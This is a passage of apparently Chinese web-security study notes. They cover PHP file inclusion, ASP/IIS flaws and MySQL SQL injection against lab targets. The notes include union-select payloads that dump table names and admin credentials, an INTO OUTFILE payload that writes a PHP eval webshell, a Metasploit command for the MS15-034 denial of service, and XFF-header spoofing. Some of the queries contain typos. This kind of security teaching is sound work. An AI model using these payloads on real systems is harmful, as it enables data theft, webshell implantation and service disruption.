php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;page&#x27;</span>]);</span><br><span class=\"line\"><span class=\"number\">1</span>.txt 内容: <span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">phpinfo</span>();<span class=\"meta\">?&gt;</span></span><br><span class=\"line\">x.php?page=phpinfo.php <span class=\"comment\">#触发文件包含漏洞，执行1.txt的代码</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"文件上传\">文件上传</h5>\n<ul>\n<li>无过滤机制、黑名单过滤机制、白名单过滤机制、文件类型过滤机制</li>\n<li>架构：\n<ul>\n<li>1、上传至服务器本身的存储磁盘(源码在一起)</li>\n<li>2、云产品 OSS 存储对象去存储文件(泄漏安全)</li>\n<li>3、把文件上传到其他域名, 如：www.xiaodi8.com-&gt; <a href=\"http://upload.xiaodi8.com\">upload.xiaodi8.com</a></li>\n</ul>\n</li>\n</ul>\n<h5 id=\"文件删除\">文件删除</h5>\n<ul>\n<li>unlink() 文件删除函数</li>\n<li>调用命令删除：system shell_exex exec</li>\n</ul>\n<h5 id=\"文件下载\">文件下载</h5>\n<ul>\n<li>修改 HTTP 头实现文件读取解析下载</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Disposition: attachment; filename=&quot;</span><span class=\"string\">&quot;);</span></span><br><span class=\"line\"><span class=\"string\">header(&quot;</span>Content-<span class=\"attr\">Length</span>: <span class=\"string\">&quot; . filesize(<span class=\"subst\">$file</span>));</span></span><br><span class=\"line\"><span class=\"string\">readfile(<span class=\"subst\">$file</span>);</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"文件编辑\">文件编辑</h5>\n<ul>\n<li>\n<p>1.file_get_contents() 读取文件内容</p>\n</li>\n<li>\n<p>2.fopen() fread() 文件打开读入</p>\n</li>\n<li>\n<p>存在的安全漏洞：跨过对操作文件的执行，进行对其他目录文件的执行，如果使用了系统命令那么可以使用管道符进行进一步的命令操作</p>\n</li>\n</ul>\n<h4 id=\"六、PHP-应用-模版引用-Smarty-渲染-MVC-模型-数据联动\">六、PHP 应用&amp;模版引用&amp;Smarty 渲染&amp;MVC 模型&amp;数据联动</h4>\n<h5 id=\"新闻列表\">新闻列表</h5>\n<ul>\n<li>\n<p>1.数据库创建新闻存储</p>\n</li>\n<li>\n<p>2.代码连接数据库读取</p>\n</li>\n<li>\n<p>3.页面进行自定义显示</p>\n</li>\n</ul>\n<h5 id=\"自写模版应用\">自写模版应用</h5>\n<ul>\n<li>1.页面显示样式编排</li>\n<li>2.显示数据插入页面</li>\n<li>3.引用模版调用触发</li>\n<li>在数据库行里添加 php 代码，会运行</li>\n<li>访问 html 代码页面，里面的 php 代码不会执行，但是 php 文件应用了含有 php 代码的 html 文件，则会执行 html 文件里面的代码</li>\n</ul>\n<h5 id=\"Smarty-模版引用\">Smarty 模版引用</h5>\n<ul>\n<li>\n<p>作用：渲染页面，提升美观，安全</p>\n</li>\n<li>\n<p>下载：<a href=\"https://github.com/smarty-php/smarty/releases\">https://github.com/smarty-php/smarty/releases</a></p>\n</li>\n<li>\n<p>使用：</p>\n<ul>\n<li>1.创建一个文件夹，命名为 samrty-demo</li>\n<li>2.下载 Smarty 对应的版本并解压到该文件夹中</li>\n<li>3.创建一个 php 文件，命名为 index.php，并在文件中添加以下代码</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 引入 Smarty 类文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">&#x27;smarty-demo/libs/Smarty.class.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建 Smarty 实例</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$smarty</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Smarty</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 Smarty 相关属性</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$smarty</span>-&gt;template_dir = <span class=\"string\">&#x27;smarty-demo/templates/&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$smarty</span>-&gt;compile_dir = <span class=\"string\">&#x27;smarty-demo/templates_c/&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$smarty</span>-&gt;cache_dir = <span class=\"string\">&#x27;smarty-demo/cache/&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$smarty</span>-&gt;config_dir = <span class=\"string\">&#x27;smarty-demo/configs/&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 赋值变量到模板中</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$smarty</span>-&gt;<span class=\"title function_ invoke__\">assign</span>(<span class=\"string\">&#x27;title&#x27;</span>, <span class=\"string\">&#x27;欢迎使用 Smarty&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 显示模板</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$smarty</span>-&gt;<span class=\"title function_ invoke__\">display</span>(<span class=\"string\">&#x27;index.tpl&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>4.创建一个名为 index.tpl 的模版文件，并将一下代码复制到上述点定义文件夹中</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;title&gt;&#123;<span class=\"variable\">$title</span>&#125;&lt;/title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;h1&gt;&#123;<span class=\"variable\">$title</span>&#125;&lt;/h1&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p&gt;这是一个使用 Smarty 的例子。&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"代码-RCE-安全测试\">代码 RCE 安全测试</h5>\n<ul>\n<li>\n<p>1.自写模版的安全隐患</p>\n</li>\n<li>\n<p>2.第三方 Smarty 的安全隐患</p>\n</li>\n<li>\n<p>从功能点上面找漏洞</p>\n</li>\n<li>\n<p>项目用到的组件，可能有漏洞，思考组件会不会调用到关键函数</p>\n</li>\n</ul>\n<h4 id=\"七、PHP-应用-ThinkPHP-框架-路由访问-对象操作-内置过滤绕过-核心漏洞\">七、PHP 应用&amp;ThinkPHP 框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞</h4>\n<h5 id=\"TP-框架-开发-配置架构-路由-MVC-模型\">TP 框架-开发-配置架构&amp;路由&amp;MVC 模型</h5>\n<ul>\n<li>参考：<a href=\"https://www.kancloud.cn/manual/thinkphp5_1\">https://www.kancloud.cn/manual/thinkphp5_1</a></li>\n<li>1.配置架构-导入引用</li>\n<li>2.路由访问-URL 访问</li>\n<li>3.数据库操作-应用对象</li>\n<li>4.文件上传操作-应用对象</li>\n<li>5.前端页面渲染-MVC 模型</li>\n</ul>\n<h5 id=\"TP-框架-安全-不安全写法-版本过滤绕过\">TP 框架-安全-不安全写法&amp;版本过滤绕过</h5>\n<ul>\n<li>1.内置代码写法\n<ul>\n<li>例子：不合规的代码安全绕过-TP5-自写</li>\n</ul>\n</li>\n<li>2.框架版本安全\n<ul>\n<li>例子：写法内置安全绕过-TP5-SQL 注入</li>\n<li>例子：内置版本安全漏洞-TP5-代码执行</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"逻辑漏洞\">逻辑漏洞</h5>\n<ul>\n<li>用户身份在数据库中有 uid 类似的数据，这项数据不同数值会表示不同身份（管理员，会员，游客等等），通过修改这项数据，可以跨身份。</li>\n</ul>\n<h3 id=\"JS-开发\">JS 开发</h3>\n<h3 id=\"JAVA-开发\">JAVA 开发</h3>\n<h2 id=\"WEB-攻防\">WEB 攻防</h2>\n<h3 id=\"ASP-安全\">ASP 安全</h3>\n<h4 id=\"默认安装-MDB-数据库泄露下载\">默认安装-MDB 数据库泄露下载</h4>\n<ul>\n<li>由于大部分 ASP 程序与 ACCESS 数据库搭建，但 ACCESS 无需连接，都在脚本文件中定义配置好数据库路径即用，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解密数据实现攻击</li>\n</ul>\n<h4 id=\"HTTP-sys-远程执行代码漏洞\">HTTP.sys 远程执行代码漏洞</h4>\n<p><strong>HTTP.SYS（CVE-2015-1635）</strong></p>\n<p><a href=\"https://blog.csdn.net/qq_41210745/article/details/103437683\">https://blog.csdn.net/qq_41210745/article/details/103437683</a></p>\n<ul>\n<li>\n<p>漏洞描述：</p>\n<ul>\n<li>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</li>\n</ul>\n</li>\n<li>\n<p>影响版本：</p>\n<ul>\n<li>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</li>\n</ul>\n</li>\n<li>\n<p>漏洞利用条件：</p>\n<ul>\n<li>安装了 IIS6.0 以上的 Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2 版本</li>\n</ul>\n</li>\n<li>\n<p>漏洞复现：</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\"></span><br><span class=\"line\">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">set</span> rhosts xx.xx.xx.xx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">set</span> rport xx</span><br><span class=\"line\"></span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"IIS-短文件\">IIS 短文件</h4>\n<ul>\n<li>介绍：\n<ul>\n<li>此漏洞实际是由 HTTP 请求中旧 DOS 8.3 名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在 Web 根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件, 并获取有关应用程序基础结构的信息</li>\n</ul>\n</li>\n<li>漏洞成因：\n<ul>\n<li>为了兼容 16 位 MS-DOS 程序, Windows 为文件名较长的文件(和文件夹)生成了对应的 windows 8.3 短文件名。在 Windows 下查看对应的短文件名, 可以使用命令 dir /x</li>\n</ul>\n</li>\n<li>应用场景：\n<ul>\n<li>后台路径获取，数据库文件获取，其他敏感文件获取等</li>\n</ul>\n</li>\n<li>利用工具：\n<ul>\n<li><a href=\"https://github.com/irsdl/IIS-ShortName-Scanner\">https://github.com/irsdl/IIS-ShortName-Scanner</a></li>\n<li><a href=\"https://github.com/lijiejie/IIS_shortname_Scanner\">https://github.com/lijiejie/IIS_shortname_Scanner</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"IIS-文件解析（IIS-6-无补丁）\">IIS 文件解析（IIS 6 无补丁）</h4>\n<ul>\n<li>该版本默认会将 ***.asp;.jpg ** 此种格式的文件名，当成 asp 解析</li>\n<li>该版本默认会将 ***.asp/目录下 ** 的所有文件当成 asp 解析</li>\n</ul>\n<h3 id=\"PHP-SQL-注入\">PHP-SQL 注入</h3>\n<h4 id=\"一、相关基础\">一、相关基础</h4>\n<h5 id=\"1-MYSQL-Web-组成架构\">1.MYSQL-Web 组成架构</h5>\n<ul>\n<li>服务器安装 MYSQL 数据库，搭建多个站点，数据库集中存储 MYSQL 数据库中管理，可以都使用 root 用户管理也可以创建多个用户进行每个网站对应的数据库管理</li>\n</ul>\n<p><span style=\"font-weight:bold;\">（1）统一交给root用户管理</span></p>\n<ul>\n<li><a href=\"http://www.zblog.com\">www.zblog.com</a>  = zblog  = root =&gt; MYSQL</li>\n<li><a href=\"http://www.demo01.com\">www.demo01.com</a> = demo01 = root =&gt; MYSQL</li>\n</ul>\n<p><span style=\"font-weight:bold;\">（2）一对一用户管理（推荐）</span></p>\n<ul>\n<li><a href=\"http://www.zblog.com\">www.zblog.com</a>  = zblog  = zblog =&gt; MYSQL</li>\n<li><a href=\"http://www.demo01.com\">www.demo01.com</a> = demo01 = demo01 =&gt; MYSQL</li>\n</ul>\n<h5 id=\"2-常规查询\">2.常规查询</h5>\n<ul>\n<li>\n<p>获取相关数据：</p>\n<ul>\n<li>\n<p>1、数据库版本-看是否符合 information_schema 查询-version() --SELECT VERSION();</p>\n</li>\n<li>\n<p>2、数据库用户-看是否符合 ROOT 型注入攻击-user() --SELECT USER();</p>\n</li>\n<li>\n<p>3、当前操作系统-看是否支持大小写(Linux 区分大小写)或文件路径选择-@@version_compile_os</p>\n</li>\n<li>\n<p>4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()</p>\n</li>\n<li>\n<p>MYSQL 5.0 以上版本：自带的数据库名为 <code>information_schema</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">information_schema  #存储数据库下的数据库名及表名，列名信息的表</span><br><span class=\"line\">&quot;.&quot;代表下一级 select *from security.users</span><br><span class=\"line\">infomation_schema.schemata #记录数据库的表</span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">information_schema.tables   #记录表名信息的表</span><br></pre></td></tr></table></figure>\n<p>![](…/images/网安知识点/image (1).png)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">information_schema.columns   #记录列名信息表</span><br></pre></td></tr></table></figure>\n<p>![](…/images/网安知识点/image (2).png)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schema_name：information_schema.schemata  #记录数据库名信息的列名值（数据库名字）</span><br><span class=\"line\"></span><br><span class=\"line\">table_schema：information_schema.tables   #记录数据库名的列名值</span><br><span class=\"line\"></span><br><span class=\"line\">table_name：information_schema.tables     #记录表名的列名值</span><br><span class=\"line\"></span><br><span class=\"line\">column_name：information_schema.columns   #记录列名的列名值</span><br></pre></td></tr></table></figure>\n<p>![](…/images/网安知识点/image (3).png)</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/imageasdf.png\" alt=\"\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p>简单注入流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by 6   #确认有几列，报错与不报错，取不报错那列</span><br><span class=\"line\"></span><br><span class=\"line\">union select 1,2,3,4,5,6   #找能看见回显的</span><br><span class=\"line\"></span><br><span class=\"line\">union select 1,2,3,database(),user(),6    #联合查询数据库名和数据库连接的用户</span><br><span class=\"line\"></span><br><span class=\"line\">union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema = ‘demo1’   #查demo1数据库中的表名，group_concat是查全部的表名</span><br><span class=\"line\"> </span><br><span class=\"line\">union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema = ‘demo1’  and table_name = ‘admin’    #查admin表中的列名</span><br><span class=\"line\"></span><br><span class=\"line\">union select 1,2,3,4，group_concat(id,usename,password),6 from admin</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"3-跨库查询\">3.跨库查询</h5>\n<ul>\n<li>\n<p>影响条件：当前数据库 root 用户权限</p>\n</li>\n<li>\n<p>测试不同数据库用户：root demo</p>\n</li>\n<li>\n<p><code>http://127.0.0.1/sql/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from infoemation_schema.schemata --+</code></p>\n<p>![](…/images/网安知识点/image (4).png)</p>\n</li>\n<li>\n<p><code>http://127.0.0.1/sql/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema.tables where table_schema = 'test' --+</code></p>\n<p>![](…/images/网安知识点/image (5).png)</p>\n</li>\n<li>\n<p><code>union select 1,2,3,4,group_concat(coulmn_name),6 from information_schema.columns where table_name = 'zbp_member' and table_schema = 'zblog'</code></p>\n<p>![](…/images/网安知识点/image (6).png)</p>\n</li>\n<li>\n<p><code>union select 1,group_concat(id,uname,pword),3 from test.admin --+</code></p>\n<p>![](…/images/网安知识点/image (7).png)</p>\n</li>\n</ul>\n<h5 id=\"4-文件续写\">4.文件续写</h5>\n<ul>\n<li>\n<p>影响条件：</p>\n<ul>\n<li>1、当前数据库用户权限（root 权限才可以续写）</li>\n<li>2、secure-file-priv 设置（目录限制）（my.ini --secure_file_priv =“”）</li>\n</ul>\n</li>\n<li>\n<p>操作步骤：</p>\n<ul>\n<li>\n<p><code>union select 2,load_file('d:\\\\1.txt'),3</code></p>\n<p>![](…/images/网安知识点/image (8).png)</p>\n</li>\n<li>\n<p><code>union select 1,'&lt;?php eval(@$_POST[1]); ?&gt;',3 into outfile 'D:/phpstudy_pro/www/sql/shell.php'</code></p>\n<p>![](…/images/网安知识点/image (9).png)</p>\n</li>\n</ul>\n</li>\n<li>\n<p>写入存在的一些问题：</p>\n<ul>\n<li>1、写入的内容其中 “ ” 单引号会引起报错（可能是没有闭合）</li>\n<li>2、目录\\和/，win 用/比较好</li>\n</ul>\n</li>\n<li>\n<p>解决：单引号过滤绕过方式</p>\n<ul>\n<li>SQL 注入语句中用单引号就不要用编码（0x 十六进制），编码就不用单引号（路径，表名，数据库名等）</li>\n</ul>\n</li>\n<li>\n<p>读写的路径的问题：</p>\n<ul>\n<li>1.报错显示获取路径</li>\n<li>2.phpinfo 页面泄露</li>\n</ul>\n</li>\n<li>\n<p>如果不知道路径思路：</p>\n<ul>\n<li>利用常见的默认的中间件，数据库等安装路径读取有价值的信息</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"5-网上相关资料\">5.网上相关资料</h5>\n<ul>\n<li>五大主流数据库比较：<a href=\"https://blog.csdn.net/amork/article/details/6830353\">https://blog.csdn.net/amork/article/details/6830353</a></li>\n<li>MYSQL 中 concat()、concat_ws()、group_concat 函数使用技巧心得：<a href=\"https://zhuanlan.zhihu.com/p/257399676\">https://zhuanlan.zhihu.com/p/257399676</a></li>\n<li>SQL 注入中无法利用 information_scema 的情况：<a href=\"https://blog.csdn.net/qq_43936524/article/details/116796087\">https://blog.csdn.net/qq_43936524/article/details/116796087</a></li>\n<li>查询数据库的数据库名和表名（mysql、mssql、oracle）</li>\n</ul>\n<h4 id=\"二、基础绕过方法\">二、基础绕过方法</h4>\n<h5 id=\"1-数据请求类型\">1.数据请求类型</h5>\n<ul>\n<li>SQL 语句由于在黑盒中是无法预知写法的，SQL 注入能发成功是需要拼接原 SQL 语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原 SQL 语句的未知性导致的拼接失败！</li>\n<li>由于开发者对于数据类型和 SQL 语句写法（框架写法）导致 SQL 注入拼接失败</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 数字型（无符号干扰）</span><br><span class=\"line\">select * from news where id = $id;</span><br><span class=\"line\"></span><br><span class=\"line\">2. 字符型（有符号干扰）</span><br><span class=\"line\">select * from news where id = &#x27;$id&#x27;;</span><br><span class=\"line\">select * from news where id = &quot;$id&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">3. 搜索型（有多个符号干扰）</span><br><span class=\"line\">select * from news where id like &#x27;%$id%&#x27;;</span><br><span class=\"line\">select * from news where id like &quot;%$id%&quot;;</span><br><span class=\"line\">select * from news where id like &#x27;_$id_&#x27;;</span><br><span class=\"line\">select * from news where id like &quot;_$id_&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">4. 框架型（有各种符号干扰）</span><br><span class=\"line\">select * from news where id = (&#x27;$id&#x27;);</span><br><span class=\"line\">select * from news where id = ((&quot;$id&quot;));</span><br><span class=\"line\">select * from news where (id = &#x27;$id&#x27;);</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-数据请求方法\">2.数据请求方法</h5>\n<ul>\n<li>\n<p>全局变量方法：</p>\n<ul>\n<li><code>$_GET[]</code>：<code>GET</code> 方法获取参数</li>\n<li><code>$_POST[]</code>：<code>POST</code> 方法获取参数</li>\n<li><code>$_SERVER[]</code>：获取服务器/客户端的信息，比如 UA 头、XFF 头、Rerferer 头等</li>\n<li><code>$_FILE[]</code>：获取文件信息</li>\n<li><code>$_COOKIE[]</code>：获取 <code>Cookie</code> 信息</li>\n</ul>\n</li>\n<li>\n<p><strong>User-Agent</strong>:</p>\n<ul>\n<li>使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中</li>\n</ul>\n</li>\n<li>\n<p><strong>Cookie</strong>:</p>\n<ul>\n<li>网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据 X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP 的请求端真实的 IP,（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库 or 某文件 [通过修改 XXF 头可以实现伪造 IP]）.</li>\n</ul>\n</li>\n<li>\n<p><strong>Rerfere</strong>:</p>\n<ul>\n<li>浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.</li>\n</ul>\n</li>\n<li>\n<p><strong>Host</strong>：</p>\n<ul>\n<li>客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号</li>\n</ul>\n</li>\n<li>\n<p>墨者 X-Forwarded-For 注入漏洞实战：<a href=\"https://blog.csdn.net/qq_49780354/article/details/123402925\">https://blog.csdn.net/qq_49780354/article/details/123402925</a></p>\n</li>\n<li>\n<p>如功能点：</p>\n<ul>\n<li>1.用户登录时</li>\n<li>2.登录判断 ip 时，是 PHP 特性中的 <code>$_SERVER['HTTP_X_FORWARDED_FOR'];</code> 接受 IP 的绕过（只有 php 才有 xff 头可以改 ip）\n<ul>\n<li>实现：代码配置固定 IP 去判断-策略绕过</li>\n<li>实现：数据库白名单 IP 去判断-select 注入</li>\n<li>实现：防注入记录 IP 去保存数据库-insert 注入</li>\n</ul>\n</li>\n<li>3.文件上传将文件名写入数据库-insert 注入</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"3-数据库请求格式\">3.数据库请求格式</h5>\n<ul>\n<li>1.数据采用统一格式传输，后端进行格式解析带入数据库（json）</li>\n<li>2.数据库采用加密编码传输，后端进行解密解码带入数据库（base64）</li>\n</ul>\n<h5 id=\"4-文件头注入-非常规注入语句\">4.文件头注入-非常规注入语句</h5>\n<ul>\n<li>同样，如果它有这样的需求，有插入像图片、音频这样的文件</li>\n<li>并且在后端会将文件名这些东西保存到数据库里，那就可能会导致注入</li>\n<li>这里引出的内容就是 <strong>SQL 注入不止是 SELECT 查询注入</strong>，像 INSERT、UPDATE、DELETE 这些也存在注入</li>\n<li>这些应该会在之后的课程中讲到，这里只需要知道有这些注入方式即可</li>\n<li>参考文章：利用 insert、update 和 delete 注入获得数据  <a href=\"https://www.cnblogs.com/babers/articles/7252401.html\">https://www.cnblogs.com/babers/articles/7252401.html</a></li>\n</ul>\n<h5 id=\"5-XFF-头绕过-绕过-ip-检测\">5.XFF 头绕过-绕过 ip 检测</h5>\n<ul>\n<li>\n<p><span style=\"font-weight:bold;\">X-Forwarded-For</span>是一个 HTTP 扩展头部，用于标识通过<span style=\"font-weight:bold;\">代理服务器</span>连接到<span style=\"font-weight:bold;\"> Web 服务器的客户端的原始 IP 地址</span>。它最初由 Squid 缓存代理软件引入，现在已成为事实上的标准，被广泛应用于 HTTP 代理、负载均衡等转发服务，并被写入 RFC 7239（Forwarded HTTP Extension）标准。</p>\n</li>\n<li>\n<p>这个东西是一个记录 IP 的参数，假设开发者需要记录用户的登录 IP，然后判断这个 IP 是不是属于内网地址啊，如果是内网地址才让登录，不是就不让登录； 或者就仅仅是记录一下 IP 等等。</p>\n</li>\n<li>\n<p><strong>如果是后者，那么是不是就是我们上面讲的非常规的注入点之一啊？</strong></p>\n</li>\n<li>\n<p><strong>如果是前者，那么我们就可以通过伪造 <code>XFF</code> 头尝试绕过检测，进行 SQL 注入</strong></p>\n</li>\n<li>\n<p>我们通过 sqli-libs 来进行演示，我们找到第 11 关的源码，然后在登录判断前添加如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span 